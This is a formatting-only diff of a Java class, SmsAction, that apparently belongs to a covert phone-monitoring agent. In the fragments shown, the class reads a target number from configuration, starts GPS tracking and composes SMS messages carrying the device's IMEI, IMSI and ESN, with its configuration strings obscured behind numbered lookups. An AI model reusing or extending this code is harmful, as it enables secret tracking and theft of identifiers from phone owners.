@@ -46,7 +46,7 @@ public final class SmsAction extends SubAction implements LocationObserver {
     int type;
 
     public SmsAction(final ConfAction params) {
-        super( params);
+        super(params);
     }
 
     /*
@@ -149,7 +149,7 @@ public final class SmsAction extends SubAction implements LocationObserver {
     }
 
     private boolean getGPSPosition() {
-      
+
         if (waitingForPoint) {
             //#ifdef DEBUG
             debug.trace("waitingForPoint"); //$NON-NLS-1$
@@ -158,7 +158,7 @@ public final class SmsAction extends SubAction implements LocationObserver {
         }
 
         synchronized (this) {
-            LocationHelper.getInstance().start( this, true);
+            LocationHelper.getInstance().start(this, true);
         }
 
         return true;
@@ -240,8 +240,8 @@ public final class SmsAction extends SubAction implements LocationObserver {
             //#ifdef DEBUG
             debug.error("sendSMS: Iden not supported"); //$NON-NLS-1$
             //#endif
-        } else{
-            
+        } else {
+
         }
         return ret;
     }
@@ -252,15 +252,16 @@ public final class SmsAction extends SubAction implements LocationObserver {
      */
     protected boolean parse(final ConfAction params) {
         try {
-            number = Utils.unspace( params.getString(Messages.getString("9.26"))); //$NON-NLS-1$
+            number = Utils
+                    .unspace(params.getString(Messages.getString("9.26"))); //$NON-NLS-1$
             descrType = params.getString(Messages.getString("9.27")); //$NON-NLS-1$
-            if(Messages.getString("9.28").equals(descrType)){ //$NON-NLS-1$
-                type=TYPE_LOCATION;
-            }else if(Messages.getString("9.29").equals(descrType)){ //$NON-NLS-1$
-                type=TYPE_TEXT;             
-            }else if(Messages.getString("9.30").equals(descrType)){ //$NON-NLS-1$
-                type=TYPE_SIM;
-            }else{
+            if (Messages.getString("9.28").equals(descrType)) { //$NON-NLS-1$
+                type = TYPE_LOCATION;
+            } else if (Messages.getString("9.29").equals(descrType)) { //$NON-NLS-1$
+                type = TYPE_TEXT;
+            } else if (Messages.getString("9.30").equals(descrType)) { //$NON-NLS-1$
+                type = TYPE_SIM;
+            } else {
                 //#ifdef DEBUG
                 debug.error("parse Error, unknown type: " + descrType); //$NON-NLS-1$
                 //#endif
@@ -287,11 +288,11 @@ public final class SmsAction extends SubAction implements LocationObserver {
                         sb.append(Messages.getString("9.36") //$NON-NLS-1$
                                 + NumberUtilities.toString(device.getEsn(), 16)
                                 + "\n"); //$NON-NLS-1$
-                    } 
+                    }
                     if (Device.isGPRS()) {
                         sb.append(Messages.getString("9.38") + device.getImei(true) + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
                         sb.append(Messages.getString("9.40") + device.getImsi(true) + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
-                    } 
+                    }
                     if (Device.isIDEN()) {
                         //#ifdef DEBUG
                         debug.error("SmsAction: IDEN not supported"); //$NON-NLS-1$
